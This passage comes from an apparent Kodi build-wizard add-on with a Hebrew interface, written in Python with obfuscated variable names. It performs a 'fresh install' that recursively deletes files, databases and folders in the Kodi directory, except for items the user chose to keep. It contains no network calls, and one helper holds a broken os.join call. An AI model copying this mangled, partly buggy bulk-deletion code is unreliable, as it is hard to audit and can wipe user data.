							EXCLUDES .append (O0O0O0O000OO00OOO )#line:5293
						OO00O0O0O0O0OOOO0 =dependsList (O0O0O0O000OO00OOO )#line:5294
						for O0O0O00O000000O00 in OO00O0O0O0O0OOOO0 :#line:5295
							if not O0O0O00O000000O00 in EXCLUDES :#line:5296
								EXCLUDES .append (O0O0O00O000000O00 )#line:5297
					if not OO0O000OO00000O0O in EXCLUDES :#line:5298
						EXCLUDES .append (OO0O000OO00000O0O )#line:5299
				if not O0O00O0O0000OOO0O =='':wiz .setS ('pvrclient',OO0O000OO00000O0O )#line:5300
		if wiz .getS ('pvrclient')=='':#line:5301
			for O00O00000O0OO000O in EXCLUDES :#line:5302
				if O00O00000O0OO000O .startswith ('pvr'):#line:5303
					wiz .setS ('pvrclient',O00O00000O0OO000O )#line:5304
		DP .update (0 ,"[COLOR %s]מנקה קבצים ותיקיות:"%COLOR2 )#line:5305
		O00O000OOO000000O =wiz .latestDB ('Addons')#line:5306
		for OOO000OO00O0OOO0O ,OO0000OOOO00OO0O0 ,O0OO00000O0000O0O in os .walk (OOOO00O0OO0O00OOO ,topdown =True ):#line:5307
			OO0000OOOO00OO0O0 [:]=[O0000O0OO0O0OO0OO for O0000O0OO0O0OO0OO in OO0000OOOO00OO0O0 if O0000O0OO0O0OO0OO not in EXCLUDES ]#line:5308
			for O00OO000000O00OO0 in O0OO00000O0000O0O :#line:5309
				O00OOOO00OO0O0OO0 +=1 #line:5310
				OO0O000OO00000O0O =OOO000OO00O0OOO0O .replace ('/','\\').split ('\\')#line:5311
				O000000000OO0O000 =len (OO0O000OO00000O0O )-1 #line:5313
				if OO0O000OO00000O0O [O000000000OO0O000 -2 ]=='userdata'and OO0O000OO00000O0O [O000000000OO0O000 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O000OO00000O0O [O000000000OO0O000 ]and KEEPSKIN =='true':wiz .log ("Keep Skin: %s"%os .path .join (OOO000OO00O0OOO0O ,O00OO000000O00OO0 ),xbmc .LOGNOTICE )#line:5314
				elif O00OO000000O00OO0 =='MyVideos99.db'and OO0O000OO00000O0O [O000000000OO0O000 -1 ]=='userdata'and OO0O000OO00000O0O [O000000000OO0O000 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (OOO000OO00O0OOO0O ,O00OO000000O00OO0 ),xbmc .LOGNOTICE )#line:5315
				elif O00OO000000O00OO0 =='MyVideos107.db'and OO0O000OO00000O0O [O000000000OO0O000 -1 ]=='userdata'and OO0O000OO00000O0O [O000000000OO0O000 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (OOO000OO00O0OOO0O ,O00OO000000O00OO0 ),xbmc .LOGNOTICE )#line:5316
				elif O00OO000000O00OO0 =='MyVideos116.db'and OO0O000OO00000O0O [O000000000OO0O000 -1 ]=='userdata'and OO0O000OO00000O0O [O000000000OO0O000 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (OOO000OO00O0OOO0O ,O00OO000000O00OO0 ),xbmc .LOGNOTICE )#line:5317
				elif O00OO000000O00OO0 =='MyVideos99.db'and OO0O000OO00000O0O [O000000000OO0O000 -1 ]=='userdata'and OO0O000OO00000O0O [O000000000OO0O000 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (OOO000OO00O0OOO0O ,O00OO000000O00OO0 ),xbmc .LOGNOTICE )#line:5318
				elif O00OO000000O00OO0 =='MyVideos107.db'and OO0O000OO00000O0O [O000000000OO0O000 -1 ]=='userdata'and OO0O000OO00000O0O [O000000000OO0O000 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (OOO000OO00O0OOO0O ,O00OO000000O00OO0 ),xbmc .LOGNOTICE )#line:5319
				elif O00OO000000O00OO0 =='MyVideos116.db'and OO0O000OO00000O0O [O000000000OO0O000 -1 ]=='userdata'and OO0O000OO00000O0O [O000000000OO0O000 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (OOO000OO00O0OOO0O ,O00OO000000O00OO0 ),xbmc .LOGNOTICE )#line:5320
				elif OO0O000OO00000O0O [O000000000OO0O000 -2 ]=='userdata'and OO0O000OO00000O0O [O000000000OO0O000 -1 ]=='addon_data'and 'plugin.video.anonymous.wall'in OO0O000OO00000O0O [O000000000OO0O000 ]and KEEPMOVIELIST =='true':wiz .log ("Keep View: %s"%os .path .join (OOO000OO00O0OOO0O ,O00OO000000O00OO0 ),xbmc .LOGNOTICE )#line:5321
				elif OO0O000OO00000O0O [O000000000OO0O000 -2 ]=='userdata'and OO0O000OO00000O0O [O000000000OO0O000 -1 ]=='addon_data'and 'skin.anonymous.mod'in OO0O000OO00000O0O [O000000000OO0O000 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (OOO000OO00O0OOO0O ,O00OO000000O00OO0 ),xbmc .LOGNOTICE )#line:5322
				elif OO0O000OO00000O0O [O000000000OO0O000 -2 ]=='userdata'and OO0O000OO00000O0O [O000000000OO0O000 -1 ]=='addon_data'and 'skin.Premium.mod'in OO0O000OO00000O0O [O000000000OO0O000 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (OOO000OO00O0OOO0O ,O00OO000000O00OO0 ),xbmc .LOGNOTICE )#line:5323
				elif OO0O000OO00000O0O [O000000000OO0O000 -2 ]=='userdata'and OO0O000OO00000O0O [O000000000OO0O000 -1 ]=='addon_data'and 'skin.anonymous.nox'in OO0O000OO00000O0O [O000000000OO0O000 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (OOO000OO00O0OOO0O ,O00OO000000O00OO0 ),xbmc .LOGNOTICE )#line:5324
				elif OO0O000OO00000O0O [O000000000OO0O000 -2 ]=='userdata'and OO0O000OO00000O0O [O000000000OO0O000 -1 ]=='addon_data'and 'skin.phenomenal'in OO0O000OO00000O0O [O000000000OO0O000 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (OOO000OO00O0OOO0O ,O00OO000000O00OO0 ),xbmc .LOGNOTICE )#line:5325
				elif OO0O000OO00000O0O [O000000000OO0O000 -2 ]=='userdata'and OO0O000OO00000O0O [O000000000OO0O000 -1 ]=='addon_data'and 'plugin.video.metalliq'in OO0O000OO00000O0O [O000000000OO0O000 ]and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (OOO000OO00O0OOO0O ,O00OO000000O00OO0 ),xbmc .LOGNOTICE )#line:5326
				elif OO0O000OO00000O0O [O000000000OO0O000 -2 ]=='userdata'and OO0O000OO00000O0O [O000000000OO0O000 -1 ]=='addon_data'and 'skin.titan'in OO0O000OO00000O0O [O000000000OO0O000 ]and KEEPSKIN3 =='true':wiz .log ("Install titan: %s"%os .path .join (OOO000OO00O0OOO0O ,O00OO000000O00OO0 ),xbmc .LOGNOTICE )#line:5328
				elif OO0O000OO00000O0O [O000000000OO0O000 -2 ]=='userdata'and OO0O000OO00000O0O [O000000000OO0O000 -1 ]=='addon_data'and 'pvr.iptvsimple'in OO0O000OO00000O0O [O000000000OO0O000 ]and KEEPPVR =='true':wiz .log ("Keep Pvr: %s"%os .path .join (OOO000OO00O0OOO0O ,O00OO000000O00OO0 ),xbmc .LOGNOTICE )#line:5329
				elif O00OO000000O00OO0 =='sources.xml'and OO0O000OO00000O0O [-1 ]=='userdata'and KEEPSOURCES =='true':wiz .log ("Keep Sources: %s"%os .path .join (OOO000OO00O0OOO0O ,O00OO000000O00OO0 ),xbmc .LOGNOTICE )#line:5331
				elif O00OO000000O00OO0 =='quicknav.DATA.xml'and OO0O000OO00000O0O [O000000000OO0O000 -2 ]=='userdata'and OO0O000OO00000O0O [O000000000OO0O000 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O000OO00000O0O [O000000000OO0O000 ]and KEEPTVLIST =='true':wiz .log ("Keep Tv List: %s"%os .path .join (OOO000OO00O0OOO0O ,O00OO000000O00OO0 ),xbmc .LOGNOTICE )#line:5334
				elif O00OO000000O00OO0 =='x1101.DATA.xml'and OO0O000OO00000O0O [O000000000OO0O000 -2 ]=='userdata'and OO0O000OO00000O0O [O000000000OO0O000 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O000OO00000O0O [O000000000OO0O000 ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (OOO000OO00O0OOO0O ,O00OO000000O00OO0 ),xbmc .LOGNOTICE )#line:5335
				elif O00OO000000O00OO0 =='b-srtym-b.DATA.xml'and OO0O000OO00000O0O [O000000000OO0O000 -2 ]=='userdata'and OO0O000OO00000O0O [O000000000OO0O000 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O000OO00000O0O [O000000000OO0O000 ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (OOO000OO00O0OOO0O ,O00OO000000O00OO0 ),xbmc .LOGNOTICE )#line:5336
				elif O00OO000000O00OO0 =='x1102.DATA.xml'and OO0O000OO00000O0O [O000000000OO0O000 -2 ]=='userdata'and OO0O000OO00000O0O [O000000000OO0O000 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O000OO00000O0O [O000000000OO0O000 ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (OOO000OO00O0OOO0O ,O00OO000000O00OO0 ),xbmc .LOGNOTICE )#line:5337
				elif O00OO000000O00OO0 =='b-sdrvt-b.DATA.xml'and OO0O000OO00000O0O [O000000000OO0O000 -2 ]=='userdata'and OO0O000OO00000O0O [O000000000OO0O000 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O000OO00000O0O [O000000000OO0O000 ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (OOO000OO00O0OOO0O ,O00OO000000O00OO0 ),xbmc .LOGNOTICE )#line:5338
				elif O00OO000000O00OO0 =='x1112.DATA.xml'and OO0O000OO00000O0O [O000000000OO0O000 -2 ]=='userdata'and OO0O000OO00000O0O [O000000000OO0O000 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O000OO00000O0O [O000000000OO0O000 ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (OOO000OO00O0OOO0O ,O00OO000000O00OO0 ),xbmc .LOGNOTICE )#line:5339
				elif O00OO000000O00OO0 =='b-tlvvyzyh-b.DATA.xml'and OO0O000OO00000O0O [O000000000OO0O000 -2 ]=='userdata'and OO0O000OO00000O0O [O000000000OO0O000 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O000OO00000O0O [O000000000OO0O000 ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (OOO000OO00O0OOO0O ,O00OO000000O00OO0 ),xbmc .LOGNOTICE )#line:5340
				elif O00OO000000O00OO0 =='x1111.DATA.xml'and OO0O000OO00000O0O [O000000000OO0O000 -2 ]=='userdata'and OO0O000OO00000O0O [O000000000OO0O000 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O000OO00000O0O [O000000000OO0O000 ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (OOO000OO00O0OOO0O ,O00OO000000O00OO0 ),xbmc .LOGNOTICE )#line:5341
				elif O00OO000000O00OO0 =='b-tvknyshrly-b.DATA.xml'and OO0O000OO00000O0O [O000000000OO0O000 -2 ]=='userdata'and OO0O000OO00000O0O [O000000000OO0O000 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O000OO00000O0O [O000000000OO0O000 ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (OOO000OO00O0OOO0O ,O00OO000000O00OO0 ),xbmc .LOGNOTICE )#line:5342
				elif O00OO000000O00OO0 =='x1110.DATA.xml'and OO0O000OO00000O0O [O000000000OO0O000 -2 ]=='userdata'and OO0O000OO00000O0O [O000000000OO0O000 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O000OO00000O0O [O000000000OO0O000 ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (OOO000OO00O0OOO0O ,O00OO000000O00OO0 ),xbmc .LOGNOTICE )#line:5343
				elif O00OO000000O00OO0 =='b-yldym-b.DATA.xml'and OO0O000OO00000O0O [O000000000OO0O000 -2 ]=='userdata'and OO0O000OO00000O0O [O000000000OO0O000 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O000OO00000O0O [O000000000OO0O000 ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (OOO000OO00O0OOO0O ,O00OO000000O00OO0 ),xbmc .LOGNOTICE )#line:5344
				elif O00OO000000O00OO0 =='x1114.DATA.xml'and OO0O000OO00000O0O [O000000000OO0O000 -2 ]=='userdata'and OO0O000OO00000O0O [O000000000OO0O000 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O000OO00000O0O [O000000000OO0O000 ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (OOO000OO00O0OOO0O ,O00OO000000O00OO0 ),xbmc .LOGNOTICE )#line:5345
				elif O00OO000000O00OO0 =='b-mvzyqh-b.DATA.xml'and OO0O000OO00000O0O [O000000000OO0O000 -2 ]=='userdata'and OO0O000OO00000O0O [O000000000OO0O000 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O000OO00000O0O [O000000000OO0O000 ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (OOO000OO00O0OOO0O ,O00OO000000O00OO0 ),xbmc .LOGNOTICE )#line:5346
				elif O00OO000000O00OO0 =='mainmenu.DATA.xml'and OO0O000OO00000O0O [O000000000OO0O000 -2 ]=='userdata'and OO0O000OO00000O0O [O000000000OO0O000 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O000OO00000O0O [O000000000OO0O000 ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (OOO000OO00O0OOO0O ,O00OO000000O00OO0 ),xbmc .LOGNOTICE )#line:5347
				elif O00OO000000O00OO0 =='skin.Premium.mod.properties'and OO0O000OO00000O0O [O000000000OO0O000 -2 ]=='userdata'and OO0O000OO00000O0O [O000000000OO0O000 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O000OO00000O0O [O000000000OO0O000 ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (OOO000OO00O0OOO0O ,O00OO000000O00OO0 ),xbmc .LOGNOTICE )#line:5348
				elif O00OO000000O00OO0 =='x1122.DATA.xml'and OO0O000OO00000O0O [O000000000OO0O000 -2 ]=='userdata'and OO0O000OO00000O0O [O000000000OO0O000 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O000OO00000O0O [O000000000OO0O000 ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (OOO000OO00O0OOO0O ,O00OO000000O00OO0 ),xbmc .LOGNOTICE )#line:5350
				elif O00OO000000O00OO0 =='b-spvrt-b.DATA.xml'and OO0O000OO00000O0O [O000000000OO0O000 -2 ]=='userdata'and OO0O000OO00000O0O [O000000000OO0O000 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O000OO00000O0O [O000000000OO0O000 ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (OOO000OO00O0OOO0O ,O00OO000000O00OO0 ),xbmc .LOGNOTICE )#line:5351
				elif O00OO000000O00OO0 =='favourites.xml'and OO0O000OO00000O0O [-1 ]=='userdata'and KEEPFAVS =='true':wiz .log ("Keep Favourites: %s"%os .path .join (OOO000OO00O0OOO0O ,O00OO000000O00OO0 ),xbmc .LOGNOTICE )#line:5356
				elif O00OO000000O00OO0 =='guisettings.xml'and OO0O000OO00000O0O [-1 ]=='userdata'and KEEPSOUND =='true':wiz .log ("Keep Sound: %s"%os .path .join (OOO000OO00O0OOO0O ,O00OO000000O00OO0 ),xbmc .LOGNOTICE )#line:5358
				elif O00OO000000O00OO0 =='profiles.xml'and OO0O000OO00000O0O [-1 ]=='userdata'and KEEPPROFILES =='true':wiz .log ("Keep Profiles: %s"%os .path .join (OOO000OO00O0OOO0O ,O00OO000000O00OO0 ),xbmc .LOGNOTICE )#line:5359
				elif O00OO000000O00OO0 =='advancedsettings.xml'and OO0O000OO00000O0O [-1 ]=='userdata'and KEEPADVANCED =='true':wiz .log ("Keep Advanced Settings: %s"%os .path .join (OOO000OO00O0OOO0O ,O00OO000000O00OO0 ),xbmc .LOGNOTICE )#line:5360
				elif OO0O000OO00000O0O [O000000000OO0O000 -2 ]=='userdata'and OO0O000OO00000O0O [O000000000OO0O000 -1 ]=='addon_data'and 'plugin.video.sdarot.tv'in OO0O000OO00000O0O [O000000000OO0O000 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OOO000OO00O0OOO0O ,O00OO000000O00OO0 ),xbmc .LOGNOTICE )#line:5361
				elif OO0O000OO00000O0O [O000000000OO0O000 -2 ]=='userdata'and OO0O000OO00000O0O [O000000000OO0O000 -1 ]=='addon_data'and 'program.apollo'in OO0O000OO00000O0O [O000000000OO0O000 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OOO000OO00O0OOO0O ,O00OO000000O00OO0 ),xbmc .LOGNOTICE )#line:5362
				elif OO0O000OO00000O0O [O000000000OO0O000 -2 ]=='userdata'and OO0O000OO00000O0O [O000000000OO0O000 -1 ]=='addon_data'and 'plugin.video.allmoviesin'in OO0O000OO00000O0O [O000000000OO0O000 ]and KEEPVICTORY =='true':wiz .log ("Keep Info: %s"%os .path .join (OOO000OO00O0OOO0O ,O00OO000000O00OO0 ),xbmc .LOGNOTICE )#line:5363
				elif OO0O000OO00000O0O [O000000000OO0O000 -2 ]=='userdata'and OO0O000OO00000O0O [O000000000OO0O000 -1 ]=='addon_data'and 'plugin.video.telemedia'in OO0O000OO00000O0O [O000000000OO0O000 ]and KEEPTELEMEDIA =='true':wiz .log ("Keep Info: %s"%os .path .join (OOO000OO00O0OOO0O ,O00OO000000O00OO0 ),xbmc .LOGNOTICE )#line:5364
				elif OO0O000OO00000O0O [O000000000OO0O000 -2 ]=='userdata'and OO0O000OO00000O0O [O000000000OO0O000 -1 ]=='addon_data'and 'plugin.video.elementum'in OO0O000OO00000O0O [O000000000OO0O000 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OOO000OO00O0OOO0O ,O00OO000000O00OO0 ),xbmc .LOGNOTICE )#line:5367
				elif OO0O000OO00000O0O [O000000000OO0O000 -2 ]=='userdata'and OO0O000OO00000O0O [O000000000OO0O000 -1 ]=='addon_data'and 'plugin.audio.soundcloud'in OO0O000OO00000O0O [O000000000OO0O000 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OOO000OO00O0OOO0O ,O00OO000000O00OO0 ),xbmc .LOGNOTICE )#line:5369
				elif OO0O000OO00000O0O [O000000000OO0O000 -2 ]=='userdata'and OO0O000OO00000O0O [O000000000OO0O000 -1 ]=='addon_data'and 'weather.yahoo'in OO0O000OO00000O0O [O000000000OO0O000 ]and KEEPWEATHER =='true':wiz .log ("Keep weather: %s"%os .path .join (OOO000OO00O0OOO0O ,O00OO000000O00OO0 ),xbmc .LOGNOTICE )#line:5370
				elif OO0O000OO00000O0O [O000000000OO0O000 -2 ]=='userdata'and OO0O000OO00000O0O [O000000000OO0O000 -1 ]=='addon_data'and 'plugin.video.quasar'in OO0O000OO00000O0O [O000000000OO0O000 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OOO000OO00O0OOO0O ,O00OO000000O00OO0 ),xbmc .LOGNOTICE )#line:5371
				elif OO0O000OO00000O0O [O000000000OO0O000 -2 ]=='userdata'and OO0O000OO00000O0O [O000000000OO0O000 -1 ]=='addon_data'and 'program.apollo'in OO0O000OO00000O0O [O000000000OO0O000 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OOO000OO00O0OOO0O ,O00OO000000O00OO0 ),xbmc .LOGNOTICE )#line:5372
				elif OO0O000OO00000O0O [O000000000OO0O000 -2 ]=='userdata'and OO0O000OO00000O0O [O000000000OO0O000 -1 ]=='addon_data'and 'plugin.video.PastebinPlay'in OO0O000OO00000O0O [O000000000OO0O000 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (OOO000OO00O0OOO0O ,O00OO000000O00OO0 ),xbmc .LOGNOTICE )#line:5373
				elif OO0O000OO00000O0O [O000000000OO0O000 -2 ]=='userdata'and OO0O000OO00000O0O [O000000000OO0O000 -1 ]=='addon_data'and 'plugin.video.playlistLoader'in OO0O000OO00000O0O [O000000000OO0O000 ]and KEEPPLAYLIST =='true':wiz .log ("Keep playlist: %s"%os .path .join (OOO000OO00O0OOO0O ,O00OO000000O00OO0 ),xbmc .LOGNOTICE )#line:5374
				elif O00OO000000O00OO0 in LOGFILES :wiz .log ("Keep Log File: %s"%O00OO000000O00OO0 ,xbmc .LOGNOTICE )#line:5375
				elif O00OO000000O00OO0 .endswith ('.db'):#line:5376
					try :#line:5377
						if O00OO000000O00OO0 ==O00O000OOO000000O and KODIV >=17 :wiz .log ("Ignoring %s on v%s"%(O00OO000000O00OO0 ,KODIV ),xbmc .LOGNOTICE )#line:5378
						else :os .remove (os .path .join (OOO000OO00O0OOO0O ,O00OO000000O00OO0 ))#line:5379
					except Exception as OO0O000O0O0000000 :#line:5380
						if not O00OO000000O00OO0 .startswith ('Textures13'):#line:5381
							wiz .log ('Failed to delete, Purging DB',xbmc .LOGNOTICE )#line:5382
							wiz .log ("-> %s"%(str (OO0O000O0O0000000 )),xbmc .LOGNOTICE )#line:5383
							wiz .purgeDb (os .path .join (OOO000OO00O0OOO0O ,O00OO000000O00OO0 ))#line:5384
				else :#line:5385
					DP .update (int (wiz .percentage (O00OOOO00OO0O0OO0 ,OO0O00O000O000O00 )),'','[COLOR %s]File: [/COLOR][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00OO000000O00OO0 ),'')#line:5386
					try :os .remove (os .path .join (OOO000OO00O0OOO0O ,O00OO000000O00OO0 ))#line:5387
					except Exception as OO0O000O0O0000000 :#line:5388
						wiz .log ("Error removing %s"%os .path .join (OOO000OO00O0OOO0O ,O00OO000000O00OO0 ),xbmc .LOGNOTICE )#line:5389
						wiz .log ("-> / %s"%(str (OO0O000O0O0000000 )),xbmc .LOGNOTICE )#line:5390
			if DP .iscanceled ():#line:5391
				DP .close ()#line:5392
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:5393
				return False #line:5394
		for OOO000OO00O0OOO0O ,OO0000OOOO00OO0O0 ,O0OO00000O0000O0O in os .walk (OOOO00O0OO0O00OOO ,topdown =True ):#line:5395
			OO0000OOOO00OO0O0 [:]=[OOO0O00OOO000O000 for OOO0O00OOO000O000 in OO0000OOOO00OO0O0 if OOO0O00OOO000O000 not in EXCLUDES ]#line:5396
			for O00OO000000O00OO0 in OO0000OOOO00OO0O0 :#line:5397
			  DP .update (100 ,'','Cleaning Up Empty Folder: [COLOR %s]%s[/COLOR]'%(COLOR1 ,O00OO000000O00OO0 ),'')#line:5398
			  if O00OO000000O00OO0 not in ["Database","userdata","temp","addons","addon_data"]:#line:5399
			   if not (O00OO000000O00OO0 =='script.skinshortcuts'and KEEPSKIN =='true'):#line:5400
			    if not (O00OO000000O00OO0 =='skin.titan'and KEEPSKIN3 =='true'):#line:5402
			      if not (O00OO000000O00OO0 =='pvr.iptvsimple'and KEEPPVR =='true'):#line:5403
			       if not (O00OO000000O00OO0 =='plugin.video.metalliq'and KEEPMOVIELIST =='true'):#line:5404
			        if not (O00OO000000O00OO0 =='plugin.video.sdarot.tv'and KEEPINFO =='true'):#line:5405
			         if not (O00OO000000O00OO0 =='program.apollo'and KEEPINFO =='true'):#line:5406
			          if not (O00OO000000O00OO0 =='script.skinshortcuts'and KEEPHUBMOVIE =='true'):#line:5407
			           if not (O00OO000000O00OO0 =='weather.yahoo'and KEEPWEATHER =='true'):#line:5408
			            if not (O00OO000000O00OO0 =='plugin.video.playlistLoader'and KEEPPLAYLIST =='true'):#line:5409
			             if not (O00OO000000O00OO0 =='script.skinshortcuts'and KEEPHUBTVSHOW =='true'):#line:5410
			              if not (O00OO000000O00OO0 =='script.skinshortcuts'and KEEPHUBTV =='true'):#line:5411
			               if not (O00OO000000O00OO0 =='script.skinshortcuts'and KEEPHUBVOD =='true'):#line:5412
			                if not (O00OO000000O00OO0 =='script.skinshortcuts'and KEEPHUBKIDS =='true'):#line:5413
			                 if not (O00OO000000O00OO0 =='script.skinshortcuts'and KEEPHUBMUSIC =='true'):#line:5414
			                  if not (O00OO000000O00OO0 =='plugin.video.neptune'and KEEPINFO =='true'):#line:5415
			                   if not (O00OO000000O00OO0 =='plugin.video.youtube'and KEEPINFO =='true'):#line:5416
			                    if not (O00OO000000O00OO0 =='service.subtitles.subscenter'and KEEPINFO =='true'):#line:5417
			                     if not (O00OO000000O00OO0 =='script.skinshortcuts'and KEEPHUBMENU =='true'):#line:5418
			                      if not (O00OO000000O00OO0 =='plugin.video.allmoviesin'and KEEPVICTORY =='true'):#line:5419
			                       if not (O00OO000000O00OO0 =='plugin.video.telemedia'and KEEPTELEMEDIA =='true'):#line:5420
			                           if not (O00OO000000O00OO0 =='plugin.audio.soundcloud'and KEEPINFO =='true'):#line:5424
			                            if not (O00OO000000O00OO0 =='plugin.video.kodipopcorntime'and KEEPINFO =='true'):#line:5425
			                             if not (O00OO000000O00OO0 =='plugin.video.torrenter'and KEEPINFO =='true'):#line:5426
			                              if not (O00OO000000O00OO0 =='plugin.video.quasar'and KEEPINFO =='true'):#line:5427
			                               if not (O00OO000000O00OO0 =='script.skinshortcuts'and KEEPTVLIST =='true'):#line:5428
			                                  shutil .rmtree (os .path .join (OOO000OO00O0OOO0O ,O00OO000000O00OO0 ),ignore_errors =True ,onerror =None )#line:5430
			if DP .iscanceled ():#line:5431
				DP .close ()#line:5432
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:5433
				return False #line:5434
		DP .close ()#line:5435
		wiz .clearS ('build')#line:5436
		if over ==True :#line:5437
			return True #line:5438
		elif install =='restore':#line:5439
			return True #line:5440
		elif install :#line:5441
			buildWizard (install ,'normal',over =True )#line:5442
		else :#line:5443
			if INSTALLMETHOD ==1 :OO000O00O0000000O =1 #line:5444
			elif INSTALLMETHOD ==2 :OO000O00O0000000O =0 #line:5445
			else :OO000O00O0000000O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצגת נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR red]הצגת נתונים[/COLOR][/B]",nolabel ="[B][COLOR green]סגירה[/COLOR][/B]")#line:5446
			if OO000O00O0000000O ==1 :wiz .reloadFix ('fresh')#line:5447
			else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:5448
	else :#line:5449
		if not install =='restore':#line:5450
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: מבוטלת![/COLOR]'%COLOR2 )#line:5451
			wiz .refresh ()#line:5452
def clearCache ():#line:5457
		wiz .clearCache ()#line:5458
def fixwizard ():#line:5462
		wiz .fixwizard ()#line:5463
def totalClean ():#line:5465
		wiz .clearCache ()#line:5467
		wiz .clearPackages ('total')#line:5468
		clearThumb ('total')#line:5469
		cleanfornewbuild ()#line:5470
def cleanfornewbuild ():#line:5471
		try :#line:5472
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.xml"))#line:5473
		except :#line:5474
			pass #line:5475
		try :#line:5476
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.json"))#line:5477
		except :#line:5478
			pass #line:5479
		try :#line:5480
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.TheFirstAvenger","localfile.txt"))#line:5481
		except :#line:5482
			pass #line:5483
def clearThumb (type =None ):#line:5484
	O0O0000O00OOO0OO0 =wiz .latestDB ('Textures')#line:5485
	if not type ==None :O0O000O0O00OO0000 =1 #line:5486
	else :O0O000O0O00OO0000 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to delete the %s and Thumbnails folder?'%(COLOR2 ,O0O0000O00OOO0OO0 ),"They will repopulate on the next startup[/COLOR]",nolabel ='[B][COLOR red]Don\'t Delete[/COLOR][/B]',yeslabel ='[B][COLOR green]Delete Thumbs[/COLOR][/B]')#line:5487
	if O0O000O0O00OO0000 ==1 :#line:5488
		try :wiz .removeFile (os .join (DATABASE ,O0O0000O00OOO0OO0 ))#line:5489
		except :wiz .log ('Failed to delete, Purging DB.');wiz .purgeDb (O0O0000O00OOO0OO0 )#line:5490
		wiz .removeFolder (THUMBS )#line:5491
	else :wiz .log ('Clear thumbnames cancelled')#line:5493
	wiz .redoThumbs ()#line:5494
def purgeDb ():#line:5496
	OO0O0OO00O000O00O =[];OOOO00O0000000O0O =[]#line:5497
	for OO00OO0OOOOOOO000 ,OO0O0OOOOOOO0OO0O ,OO00OO0O000O000OO in os .walk (HOME ):#line:5498
